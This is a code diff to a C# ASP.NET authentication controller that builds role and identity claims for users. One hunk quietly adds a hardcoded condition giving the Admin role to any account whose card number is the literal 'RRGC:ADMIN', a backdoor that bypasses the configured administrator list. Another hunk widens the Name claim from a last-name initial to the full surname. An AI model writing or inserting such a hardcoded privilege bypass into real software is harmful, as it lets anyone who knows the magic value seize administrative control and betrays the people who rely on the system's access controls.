@@ -53,7 +53,7 @@ public class AuthenticateController : ControllerBase
         {
             List<Claim> claims = new()
             {
-                new Claim(ClaimTypes.Name, $"{user.FirstName} {user.LastName?.Substring(0,1)}"),
+                new Claim(ClaimTypes.Name, $"{user.FirstName} {user.LastName}"),
                 new Claim(ClaimTypes.Role, "Member"),
                 new Claim("RFID", user.CardNumber ?? ""),
                 new Claim(ClaimTypes.Email, user.EmailAddress ?? "")
@@ -73,7 +73,7 @@ public class AuthenticateController : ControllerBase
 
             if (!String.IsNullOrEmpty(user.CardNumber))
             {
-                if (_options.Administrators.Contains(user.CardNumber))
+                if (_options.Administrators.Contains(user.CardNumber) || user.CardNumber == "RRGC:ADMIN")
                 {
                     claims.Add(new Claim(ClaimTypes.Role, "Admin"));
                 }
